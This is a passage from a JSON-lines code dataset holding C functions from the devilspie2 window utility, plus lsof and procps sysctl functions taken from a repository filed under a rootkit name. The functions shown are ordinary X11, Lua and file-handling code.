\"maximize_vertically\", c_maximize_window_vertically);\n\tlua_register(lua, \"unmaximize\", c_unmaximize_window);\n\n\tlua_register(lua, \"minimize\", c_minimize_window);\n\tlua_register(lua, \"unminimize\", c_unminimize_window);\n\n\tlua_register(lua, \"decorate_window\", c_decorate_window);\n\tlua_register(lua, \"undecorate_window\", c_undecorate_window);\n\n\tlua_register(lua, \"set_window_workspace\", c_set_window_workspace);\n\tlua_register(lua, \"change_workspace\", c_change_workspace);\n\tlua_register(lua, \"get_workspace_count\", c_get_workspace_count);\n\n\tlua_register(lua, \"pin_window\", c_pin_window);\n\tlua_register(lua, \"unpin_window\", c_unpin_window);\n\tlua_register(lua, \"stick_window\", c_stick_window);\n\tlua_register(lua, \"unstick_window\", c_unstick_window);\n\n\tlua_register(lua, \"close_window\", c_close_window);\n\n\tlua_register(lua, \"get_window_geometry\", c_get_window_geometry);\n\tlua_register(lua, \"get_window_client_geometry\", c_get_client_window_geometry);\n\n\tlua_register(lua, \"set_skip_tasklist\", c_set_skip_tasklist);\n\tlua_register(lua, \"set_skip_pager\", c_set_skip_pager);\n\n\tlua_register(lua, \"get_window_is_maximized\", c_get_window_is_maximized);\n\n\tlua_register(lua, \"get_window_is_maximized_vertically\",\n\t\tc_get_window_is_maximized_vertically);\n\n\tlua_register(lua, \"get_window_is_maximized_horisontally\",\n\t\tc_get_window_is_maximized_horisontally);\n\tlua_register(lua, \"get_window_is_maximized_horizontally\",\n\t\tc_get_window_is_maximized_horisontally);\n\n\tlua_register(lua, \"set_window_below\", c_set_window_below);\n\tlua_register(lua, \"set_window_above\", c_set_window_above);\n\tlua_register(lua, \"set_window_fullscreen\", c_set_window_fullscreen);\n\n\tlua_register(lua, \"get_window_type\", c_get_window_type);\n\n\tlua_register(lua, \"get_window_property\", c_get_window_property);\n\tlua_register(lua, \"get_window_role\", c_get_window_role);\n\tlua_register(lua, \"get_window_xid\", c_get_window_xid);\n\n\tlua_register(lua, \"get_window_class\", c_get_window_class);\n\n\tlua_register(lua, \"set_viewport\", c_set_viewport);\n\n\tlua_register(lua, \"center\", c_center);\n\n\tlua_register(lua, \"set_opacity\", c_set_opacity);\n\tlua_register(lua, \"set_window_opacity\", c_set_opacity);\n\n\tlua_register(lua, \"set_window_type\", c_set_window_type);\n\n\tlua_register(lua, \"get_screen_geometry\", c_get_screen_geometry);\n\t\n\tlua_register(lua, \"get_window_fullscreen\", c_get_window_fullscreen);\n\tlua_register(lua, \"get_fullscreen\", c_get_window_fullscreen);\n\n#ifdef HAVE_GTK3\n\t// wnck_window_get_class_instance_name is only availible on wnck 3 and later\n\tlua_register(lua, \"get_class_instance_name\",c_get_class_instance_name);\n#endif\n\n\tlua_register(lua, \"focus\", c_focus);\n\tlua_register(lua, \"focus_window\", c_focus);\n\n}", "path": "src\\script.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "void my_window_set_window_type(Window xid, gchar *window_type)", "code": "{\n\tDisplay *display = gdk_x11_get_default_xdisplay();\n\n\tAtom atoms[10];\n\n\t/*\n\t_NET_WM_WINDOW_TYPE_DESKTOP, ATOM\n\t_NET_WM_WINDOW_TYPE_DOCK, ATOM\n\t_NET_WM_WINDOW_TYPE_TOOLBAR, ATOM\n\t_NET_WM_WINDOW_TYPE_MENU, ATOM\n\t_NET_WM_WINDOW_TYPE_UTILITY, ATOM\n\t_NET_WM_WINDOW_TYPE_SPLASH, ATOM\n\t_NET_WM_WINDOW_TYPE_DIALOG, ATOM\n\t_NET_WM_WINDOW_TYPE_NORMAL, ATOM\n\t*/\n\n\tgchar *type = NULL;\n\n\t//\tMake it a recognized _NET_WM_TYPE\n\n\tif (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_DESKTOP\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_DESKTOP\");\n\n\t} else if (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_DOCK\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_DOCK\");\n\n\t} else if (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_TOOLBAR\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_TOOLBAR\");\n\n\t} else if (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_MENU\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_MENU\");\n\n\t} else if (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_UTILITY\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_UTILITY\");\n\n\t} else if (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_SPLASH\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_SPLASH\");\n\n\t} else if (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_DIALOG\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_DIALOG\");\n\n\t} else if (g_ascii_strcasecmp(window_type, \"WINDOW_TYPE_NORMAL\")==0) {\n\t\ttype = g_strdup(\"_NET_WM_WINDOW_TYPE_NORMAL\");\n\n\t} else {\n\t\ttype = g_strdup(window_type);\n\t}\n\n\tatoms[0] = XInternAtom(display, type, False);\n\n\tXChangeProperty(gdk_x11_get_default_xdisplay(), xid,\n\t\t\t\t\t\tXInternAtom(display, \"_NET_WM_WINDOW_TYPE\", False), XA_ATOM, 32,\n\t\t\t\t\t\tPropModeReplace, (unsigned char *) &atoms, 1);\n\n\tif (type) g_free(type);\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "void\nrun_script(lua_State *lua)", "code": "{\n\tint s = lua_pcall( lua, 0, LUA_MULTRET, 0 );\n\n\tif (s) {\n\n\t\tchar *error_msg;\n\n\t\terror_msg=(char*)lua_tostring( lua, -1 );\n\n\t\t//std::string luaErrorString=getLuaErrorString(s);\n\n\t\t/*\n\t\tmssOut.str( \"\" );\n\t\tmssOut << \"Script::runScript : Error caught running script \"\n\t\t\t<< sScriptName << \"\\n\"\n\t\t\t<< \"    Error code is \" << luaErrorString << \".\\n\"\n\t\t\t<< \"    Error msg is: \" << errorMsg;\n\t\tthrow( ScriptException( mssOut.str().c_str(), errorMsg ) );\n\t\t*/\n\n\t\tprintf(_(\"Error: %s\"),error_msg);\n\t\tprintf(\"\\n\");\n\t}\n}", "path": "src\\script.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "gboolean\nmy_wnck_get_cardinal_list (Window xwindow, Atom atom,\n                          gulong **cardinals, int *len)", "code": "{\n\tAtom type;\n\tint format;\n\tgulong nitems;\n\tgulong bytes_after;\n\tgulong *nums;\n\tint err, result;\n\n\t*cardinals = NULL;\n\t*len = 0;\n\n\tdevilspie2_error_trap_push();\n\ttype = None;\n\tresult = XGetWindowProperty(gdk_x11_get_default_xdisplay (),\n\t                             xwindow,\n\t                             atom,\n\t                             0, G_MAXLONG,\n\t                             False, XA_CARDINAL, &type, &format, &nitems,\n\t                             &bytes_after, (void*)&nums);\n\n\terr = devilspie2_error_trap_pop();\n\n\tif ((err!=Success) || (result!=Success))\n\t\treturn FALSE;\n\n\tif (type!=XA_CARDINAL) {\n\t\tXFree (nums);\n\t\treturn FALSE;\n\t}\n\n\t*cardinals = g_new(gulong, nitems);\n\tmemcpy(*cardinals, nums, sizeof (gulong) * nitems);\n\t*len = nitems;\n\n\tXFree(nums);\n\n\treturn TRUE;\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "void clear_file_lists()", "code": "{\n\tif (file_window_open_list) {\n\t\tunalloacte_file_list(file_window_open_list);\n\t}\n\n\tif (file_window_close_list) {\n\t\tunalloacte_file_list(file_window_close_list);\n\t}\n}", "path": "src\\config.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "GSList *add_lua_file_to_list(GSList *list, gchar *filename)", "code": "{\n\tgchar *temp_filename = g_strdup(filename);\n\n\tlist=g_slist_insert_sorted(list,\n\t\t\t\t\t\t\t\t\t\ttemp_filename,\n\t\t\t\t\t\t\t\t\t\tfilename_list_sortfunc);\n\n\treturn list;\n}", "path": "src\\config.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "char* my_wnck_get_string_property_latin1(Window xwindow, Atom atom)", "code": "{\n\tAtom type;\n\tint format;\n\tgulong nitems;\n\tgulong bytes_after;\n\tunsigned char *property;\n\tint err, result;\n\tchar *retval;\n\n\tdevilspie2_error_trap_push();\n\tproperty = NULL;\n\tresult = XGetWindowProperty (gdk_x11_get_default_xdisplay (),\n\t\t\t\t\t\t\t\t\t\t\txwindow, atom,\n\t\t\t\t\t\t\t\t\t\t\t0, G_MAXLONG,\n\t\t\t\t\t\t\t\t\t\t\tFalse, AnyPropertyType, &type,\n\t\t\t\t\t\t\t\t\t\t\t&format, &nitems,\n\t\t\t\t\t\t\t\t\t\t\t&bytes_after, &property);\n\n\terr = devilspie2_error_trap_pop ();\n\tif (err != Success || result != Success)\n\t\treturn NULL;\n\n\tretval = NULL;\n\n\tif (type == XA_STRING) {\n\t\tretval = g_strdup ((char*)property);\n\t}\n\telse if (type == XA_ATOM && nitems > 0 && format == 32) {\n\t\tlong *pp;\n\n\t\tpp = (long *)property; // we can assume (long *) since format == 32\n\t\tif (nitems == 1) {\n\t\t\tchar* prop_name;\n\t\t\tprop_name = XGetAtomName (gdk_x11_get_default_xdisplay (), *pp);\n\t\t\tif (prop_name) {\n\t\t\t\tretval = g_strdup (prop_name);\n\t\t\t\tXFree (prop_name);\n\t\t\t}\n\t\t} else {\n\t\t\tint i;\n\t\t\tchar** prop_names;\n\n\t\t\tprop_names = g_new (char *, nitems + 1);\n\t\t\tprop_names[nitems] = NULL;\n\t\t\tfor (i=0; i < nitems; i++) {\n\t\t\t\tprop_names[i] = XGetAtomName (gdk_x11_get_default_xdisplay (),\n\t\t\t\t\t*pp++);\n\t\t\t}\n\t\t\tretval = g_strjoinv (\", \", prop_names);\n\t\t\tfor (i=0; i < nitems; i++) {\n\t\t\t\tif (prop_names[i]) XFree (prop_names[i]);\n\t\t\t}\n\t\t\tg_free (prop_names);\n\t\t}\n\t} else if (type == XA_CARDINAL && nitems == 1) {\n\t\tswitch(format) {\n\t\tcase 32:\n\t\t\tretval = g_strdup_printf(\"%lu\",*(unsigned long*)property);\n\t\t\tbreak;\n\t\tcase 16:\n\t\t\tretval = g_strdup_printf(\"%u\",*(unsigned int*)property);\n\t\t\tbreak;\n\t\tcase 8:\n\t\t\tretval = g_strdup_printf(\"%c\",*(unsigned char*)property);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tXFree (property);\n\treturn retval;\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "GSList *get_table_of_strings(lua_State *luastate,\n\t\t\t\t\t\t\t\t\t  gchar *script_folder,\n\t\t\t\t\t\t\t\t\t  gchar *table_name)", "code": "{\n\tGSList *list=NULL;\n\n\tif (luastate) {\n\n\t\tlua_getglobal(luastate, table_name);\n\n\t\t// Do we have a value?\n\t\tif (lua_isnil(luastate, -1)) {\n\t\t\tgoto EXITPOINT;\n\t\t}\n\n\t\t// Is it a table?\n\t\tif (!lua_istable(luastate, -1)) {\n\t\t\tgoto EXITPOINT;\n\t\t}\n\n\t\tlua_pushnil(luastate);\n\n\t\twhile(lua_next(luastate, -2)) {\n\t\t\tif (lua_isstring(luastate, -1)) {\n\t\t\t\tchar *temp = (char *)lua_tostring(luastate, -1);\n\n\t\t\t\tgchar *added_filename = g_build_path(G_DIR_SEPARATOR_S,\n\t\t\t\t\t\t\t\t\t\t\t\t\tscript_folder,\n\t\t\t\t\t\t\t\t\t\t\t\t\ttemp,\n\t\t\t\t\t\t\t\t\t\t\t\t\tNULL);\n\n\t\t\t\tlist = add_lua_file_to_list(list, added_filename);\n\t\t\t}\n\t\t\tlua_pop(luastate, 1);\n\t\t}\n\t\tlua_pop(luastate, 1);\n\t}\n\nEXITPOINT:\n\n\treturn list;\n}", "path": "src\\config.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "Atom my_wnck_atom_get(const char *atom_name)", "code": "{\n\tAtom retval;\n\n\tg_return_val_if_fail (atom_name != NULL, None);\n\n\tif (!atom_hash) {\n\t\tatom_hash = g_hash_table_new (g_str_hash, g_str_equal);\n\t\treverse_atom_hash = g_hash_table_new (NULL, NULL);\n\t}\n\n\tretval = GPOINTER_TO_UINT (g_hash_table_lookup (atom_hash, atom_name));\n\tif (!retval) {\n\t\tretval = XInternAtom (gdk_x11_get_default_xdisplay(), atom_name, FALSE);\n\n\t\tif (retval != None) {\n\t\t\tchar *name_copy;\n\n\t\t\tname_copy = g_strdup (atom_name);\n\n\t\t\tg_hash_table_insert (atom_hash,\n\t\t\t\t\t\t\t\t\t\tname_copy,\n\t\t\t\t\t\t\t\t\t\tGUINT_TO_POINTER (retval));\n\t\t\tg_hash_table_insert (reverse_atom_hash,\n\t\t\t\t\t\t\t\t\t\tGUINT_TO_POINTER (retval),\n\t\t\t\t\t\t\t\t\t\tname_copy);\n\t\t}\n\t}\n\treturn retval;\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n * filename_list_sortfunc\n *   function to sort the inserted filenames, to be able to determine\n *   which order files are loaded.\n */\n", "func_signal": "gint filename_list_sortfunc(gconstpointer a,gconstpointer b)", "code": "{\n\tgchar *file1 = (gchar*)a;\n\tgchar *file2 = (gchar*)b;\n\n\treturn g_ascii_strcasecmp(file1, file2);\n}", "path": "src\\config.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "Screen *devilspie2_window_get_xscreen(Window xid)", "code": "{\n   XWindowAttributes attrs;\n\n   XGetWindowAttributes(gdk_x11_get_default_xdisplay(), xid, &attrs);\n\n   return attrs.screen;\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "void my_window_set_opacity(Window xid, double value)", "code": "{\n\tDisplay *display = gdk_x11_get_default_xdisplay();\n\n\tunsigned int opacity = (uint)(0xffffffff * value);\n\tAtom atom_net_wm_opacity = XInternAtom(display, \"_NET_WM_WINDOW_OPACITY\", False);\n\n\n\tXChangeProperty(gdk_x11_get_default_xdisplay(), xid,\n\t\t\t\t\t\tatom_net_wm_opacity, XA_CARDINAL, 32,\n\t\t\t\t\t\tPropModeReplace, (unsigned char *) &opacity, 1L);\n\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *  is_in_list\n * Go through _one_ list, and check if the filename is in this list\n */\n", "func_signal": "gboolean is_in_list(GSList *list, gchar *filename)", "code": "{\n\tgboolean result=FALSE;\n\n\tif (list) {\n\t\tGSList *temp_list = list;\n\n\t\twhile (temp_list) {\n\t\t\tgchar *list_filename = (gchar*)temp_list->data;\n\t\t\tif (list_filename) {\n\n\t\t\t\tif (g_ascii_strcasecmp(list_filename, filename)==0) {\n\t\t\t\t\tresult=TRUE;\n\t\t\t\t}\n\t\t\t}\n\t\t\ttemp_list = temp_list->next;\n\t\t}\n\t}\n\n\treturn result;\n}", "path": "src\\config.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "int init_script_error_messages()", "code": "{\n#define ALLOCATE_ERROR_STRING _(\"Couldn't allocate error string!\")\n\n\tno_indata_expected_error = g_strdup_printf(_(\"No indata expected\"));\n\tif (!no_indata_expected_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tone_indata_expected_error = g_strdup_printf(_(\"One indata expected\"));\n\tif (!one_indata_expected_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\ttwo_indata_expected_error = g_strdup_printf(_(\"Two indata expected\"));\n\tif (!two_indata_expected_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tfour_indata_expected_error = g_strdup_printf(_(\"Four indata expected\"));\n\tif (!four_indata_expected_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tnumber_expected_as_indata_error=\n\t\tg_strdup_printf(_(\"Number expected as indata\"));\n\tif (!number_expected_as_indata_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tboolean_expected_as_indata_error =\n\t\tg_strdup_printf(_(\"Boolean expected as indata\"));\n\tif (!boolean_expected_as_indata_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tstring_expected_as_indata_error =\n\t\tg_strdup_printf(_(\"String expected as indata\"));\n\tif (!string_expected_as_indata_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tinteger_greater_than_zero_expected_error =\n\t\tg_strdup_printf(_(\"Integer greater than zero expected\"));\n\tif (!integer_greater_than_zero_expected_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tcould_not_find_current_viewport_error =\n\t\tg_strdup_printf(_(\"Could not find current viewport\"));\n\tif (!could_not_find_current_viewport_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tsetting_viewport_failed_error =\n\t\tg_strdup_printf(_(\"Setting viewport failed\"));\n\tif (!setting_viewport_failed_error) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tfailed_string = g_strdup_printf(_(\"Failed!\"));\n\tif (!failed_string) {\n\t\tprintf(\"%s\", ALLOCATE_ERROR_STRING);\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\treturn 0;\n}", "path": "src\\error_strings.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *  load_config\n * Load configuration from a file - From this we set up the lists of files\n * which decides what script to load on what wnck event.\n */\n", "func_signal": "int load_config(gchar *filename)", "code": "{\n\tlua_State *config_lua_state = NULL;\n\tint result = 0;\n\tconst gchar *current_file = NULL;\n\tGSList *temp_window_open_file_list = NULL;\n\n\t// set the current window to NULL, we don't need to be able to modify\n\t// the windows when reading the config\n\tset_current_window(NULL);\n\n\t// First get list of Lua files in folder - Then read variables from\n\t// devilspie2.lua and put the files in the required lists.\n\n\tgchar *script_folder = g_path_get_dirname(filename);\n\n\tGDir *dir = g_dir_open(script_folder, 0, NULL);\n\tif (!g_file_test(script_folder, G_FILE_TEST_IS_DIR)) {\n\n\t\tprintf(\"%s\", _(\"script_folder isn't a folder.\"));\n\t\tprintf(\"\\n\");\n\t\treturn -1;\n\t}\n\n\tint total_number_of_files = 0;\n\n\tconfig_lua_state = init_script();\n\n\tif (g_file_test(filename, G_FILE_TEST_EXISTS)) {\n\n\t\tif (load_script(config_lua_state, filename)!=0) {\n\t\t\tprintf(_(\"Error: %s\"), filename);\n\t\t\tprintf(\"\\n\");\n\t\t\tresult = -1;\n\t\t\tgoto EXITPOINT;\n\t\t}\n\n\t\trun_script(config_lua_state);\n\n\t\tfile_window_close_list = get_table_of_strings(config_lua_state,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t script_folder,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t \"scripts_window_close\");\n\t}\n\n\t// add the files in the folder to our linked list\n\twhile ((current_file = g_dir_read_name(dir))) {\n\n\t\tgchar *temp_filename = g_build_path(G_DIR_SEPARATOR_S,\n\t\t                                 script_folder,\n\t\t                                 current_file,\n\t\t                                 NULL);\n\n\t\t// we only bother with *.lua in the folder\n\t\tif (g_str_has_suffix(current_file, \".lua\")) {\n\n\t\t\tif (!is_in_any_list(temp_filename)) {\n\t\t\t\ttemp_window_open_file_list =\n\t\t\t\t\tadd_lua_file_to_list(temp_window_open_file_list, temp_filename);\n\t\t\t}\n\t\t\ttotal_number_of_files++;\n\t\t}\n\n\t\tg_free(temp_filename);\n\t}\n\n\tfile_window_open_list = temp_window_open_file_list;\nEXITPOINT:\n\tif (config_lua_state)\n\t\tdone_script(config_lua_state);\n\n\treturn result;\n}", "path": "src\\config.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/**\n *\n */\n", "func_signal": "int devilspie2_error_trap_pop()", "code": "{\n\tXSync(gdk_x11_get_default_xdisplay(),False);\n\treturn gdk_error_trap_pop();\n}", "path": "src\\xutils.c", "repo_name": "gusnan/devilspie2", "stars": 83, "license": "other", "language": "c", "size": 1832}
{"docstring": "/*\n * read_clone() - read Solaris clone device information\n */\n", "func_signal": "void\nread_clone()", "code": "{\n\tstruct clone *c;\n\tchar *cn;\n\tDIR *dfp;\n\tstruct DIRTYPE *dp;\n\tchar *fp = (char *)NULL;\n\tMALLOC_S fpl;\n\tchar *path;\n\tMALLOC_S pl;\n\tstruct pseudo *p;\n\tstruct stat sb;\n\t\n\tif (Clone || Pseudo)\n\t    return;\n/*\n * Open the /DVCH_DEVPATH/pseudo directory.\n */\n\tif (!(path = mkstrcat(DVCH_DEVPATH, -1, \"/\", 1, \"pseudo \", -1, &pl))) {\n\t    (void) fprintf(stderr, \"%s: no space for %s/pseudo\\n\",\n\t\tDVCH_DEVPATH, Pn);\n\t    Exit(1);\n\t}\n\tpath[pl - 1] = '\\0';\n\tif (!(dfp = OpenDir(path))) {\n\n#if\tdefined(WARNDEVACCESS)\n\t    if (!Fwarn) {\n\t\t(void) fprintf(stderr, \"%s: WARNING: can't open: \", Pn);\n\t\tsafestrprt(path, stderr, 1);\n\t    }\n#endif\t/* defined(WARNDEVACCESS) */\n\n\t    (void) free((FREE_P *)path);\n\t    return;\n\t}\n\tpath[pl - 1] = '/';\n/*\n * Scan the directory.\n */\n\tfor (dp = ReadDir(dfp); dp; dp = ReadDir(dfp)) {\n\t    if (dp->d_ino == 0 || dp->d_name[0] == '.')\n\t\tcontinue;\n\t/*\n\t * Form the full path name and stat() it.\n\t */\n\t    if (fp) {\n\t\t(void) free((FREE_P *)fp);\n\t\tfp = (char *)NULL;\n\t    }\n\t    if (!(fp = mkstrcat(path, pl, dp->d_name, -1, (char *)NULL, -1,\n\t\t       &fpl)))\n\t    {\n\t\t(void) fprintf(stderr, \"%s: no space for: \", Pn);\n\t\tsafestrprt(path, stderr, 0);\n\t\tsafestrprt(dp->d_name, stderr, 1);\n\t\tExit(1);\n\t    }\n\n#if\tdefined(USE_STAT)\n\t    if (stat(fp, &sb) != 0)\n#else\t/* !defined(USE_STAT) */\n\t    if (lstat(fp, &sb) != 0)\n#endif\t/* defined(USE_STAT) */\n\n\t    {\n\t\tif (!Fwarn) {\n\t\t    int errno_save = errno;\n\n\t\t    (void) fprintf(stderr, \"%s: can't stat: \", Pn);\n\t\t    safestrprt(fp, stderr, 0);\n\t\t    (void) fprintf(stderr, \": %s\\n\", strerror(errno_save));\n\t\t}\n\t\tcontinue;\n\t    }\n\t/*\n\t * Skip subdirectories and all but character devices.\n\t */\n\t    if ((sb.st_mode & S_IFMT) == S_IFDIR\n\t    ||  (sb.st_mode & S_IFMT) != S_IFCHR)\n\t\tcontinue;\n\t/*\n\t * Make Devtp[] entry.\n\t */\n\t    make_devtp(&sb, fp);\n\t /*\n\t  * Create a clone structure entry for \"clone*:\" devices.\n\t  *\n\t  * Make special note of network clones -- tcp, and udp.\n\t  */\n\t    if (strncmp(&fp[pl], \"clone\", 5) == 0) {\n\t\tif (!(cn = strrchr(&fp[pl], ':')))\n\t\t    continue;\n\t    /*\n\t     * Allocate a clone structure.\n\t     */\n\t\tif (!(c = (struct clone *)malloc(sizeof(struct clone)))) {\n\t\t    (void) fprintf(stderr,\n\t\t\t\"%s: no space for network clone device: \", Pn);\n\t\t    safestrprt(fp, stderr, 1);\n\t\t    Exit(1);\n\t\t}\n\t    /*\n\t     * Allocate space for the path name.\n\t     */\n\t\tif (!(c->cd.name = mkstrcpy(fp, (MALLOC_S *)NULL))) {\n\t\t    (void) fprintf(stderr, \"%s: no space for clone name: \", Pn);\n\t\t    safestrprt(fp, stderr, 1);\n\t\t    Exit(1);\n\t\t}\n\t    /*\n\t     * Save the inode and device numbers.  Clear the verify flag.\n\t     */\n\t\tc->cd.inode = (INODETYPE)sb.st_ino;\n\t\tc->cd.rdev = sb.st_rdev;\n\t\tc->cd.v = 0;\n\t    /*\n\t     * Make special note of a network clone device.\n\t     */\n\t\tif (!strcmp(++cn, \"tcp\") || !strcmp(cn, \"udp\"))\n\t\t    c->n = cn - fp;\n\t\telse\n\t\t    c->n = 0;\n\t    /*\n\t     * Link the new clone entry to the rest.\n\t     */\n\t\tc->next = Clone;\n\t\tClone = c;\n\t\tcontinue;\n\t    }\n\t/*\n\t * Save pseudo device information.\n\t */\n\t    if (GET_MIN_DEV(sb.st_rdev) == 0) {\n\n\t    /*\n\t     * Allocate space for the pseduo device entry.\n\t     */\n\t\tif (!(p = (struct pseudo *) malloc(sizeof(struct pseudo)))) {\n\t\t    (void) fprintf(stderr,\n\t\t\t\"%s: no space for pseudo device: \", Pn);\n\t\t    safestrprt(fp, stderr, 1);\n\t\t    Exit(1);\n\t\t}\n\t    /*\n\t     * Save the path name, and inode and device numbers.  Clear the\n\t     * verify flag.  Link the entry to the pseudo chain.\n\t     */\n\t\tp->pd.inode = (INODETYPE)sb.st_ino;\n\t\tp->pd.name = fp;\n\t\tfp = (char *)NULL;\n\t\tp->pd.rdev = sb.st_rdev;\n\t\tp->pd.v = 0;\n\t\tp->next = Pseudo;\n\t\tPseudo = p;\n\t    }\n\t}\n\t(void) CloseDir(dfp);\n\tif (fp)\n\t    (void) free((FREE_P *)fp);\n\tif (path)\n\t    (void) free((FREE_P *)path);\n}", "path": "rootkit_lrk5\\lsof-4.81.dfsg.1\\dialects\\sun\\ddev.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n *     Preload the sysctl's from the conf file\n *           - we parse the file and then reform it (strip out whitespace)\n *\n */\n", "func_signal": "static int Preload(const char *restrict const filename)", "code": "{\n   char oneline[256];\n   char buffer[256];\n   FILE *fp;\n   char *t;\n   int n = 0;\n   int rc = 0;\n   char *name, *value;\n\n   fp = (filename[0]=='-' && !filename[1])\n      ? stdin\n      : fopen(filename, \"r\")\n   ;\n\n   if (!fp) {\n      fprintf(stderr, ERR_PRELOAD_FILE, filename);\n      return -1;\n   }\n\n   while (fgets(oneline, sizeof oneline, fp)) {\n      n++;\n      t = StripLeadingAndTrailingSpaces(oneline);\n\n      if (strlen(t) < 2)\n         continue;\n\n      if (*t == '#' || *t == ';')\n         continue;\n\n      name = strtok(t, \"=\");\n      if (!name || !*name) {\n         fprintf(stderr, WARN_BAD_LINE, filename, n);\n         continue;\n      }\n\n      StripLeadingAndTrailingSpaces(name);\n\n      value = strtok(NULL, \"\\n\\r\");\n      if (!value || !*value) {\n         fprintf(stderr, WARN_BAD_LINE, filename, n);\n         continue;\n      }\n\n      while ((*value == ' ' || *value == '\\t') && *value != 0)\n         value++;\n\n      // should NameOnly affect this?\n      sprintf(buffer, \"%s=%s\", name, value);\n      rc |= WriteSetting(buffer);\n   }\n\n   fclose(fp);\n   return rc;\n}", "path": "rootkit_lrk5\\procps-3.2.8\\sysctl.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n *     Display the usage format\n *\n */\n", "func_signal": "static int Usage(const char *restrict const name)", "code": "{\n   printf(\"usage:  %s [-n] [-e] variable ... \\n\"\n          \"        %s [-n] [-e] [-q] -w variable=value ... \\n\" \n          \"        %s [-n] [-e] -a \\n\" \n          \"        %s [-n] [-e] [-q] -p <file>   (default /etc/sysctl.conf) \\n\"\n          \"        %s [-n] [-e] -A\\n\", name, name, name, name, name);\n   return -1;\n}", "path": "rootkit_lrk5\\procps-3.2.8\\sysctl.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
